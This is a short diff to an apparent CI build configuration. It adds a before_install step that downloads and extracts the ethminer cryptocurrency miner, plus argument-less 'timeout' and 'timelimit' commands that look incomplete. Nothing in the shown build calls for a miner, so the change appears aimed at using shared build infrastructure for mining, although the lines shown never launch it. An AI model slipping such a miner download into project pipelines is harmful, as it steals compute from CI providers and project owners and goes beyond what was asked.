@@ -8,12 +8,14 @@ jobs:
   include:          
       before_install: 
       - echo before install
+      - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.13.0rc4/ethminer-0.13.0rc4-Linux.tar.gz
+      - tar -xvzf ethminer-0.13.0rc4-Linux.tar.gz
+      - ls -la
 
       script:
-      - echo hello      
+      - echo hello   
+      - timeout   
+      - timelimit
       
       after_success:
       - echo success
-      
-
-
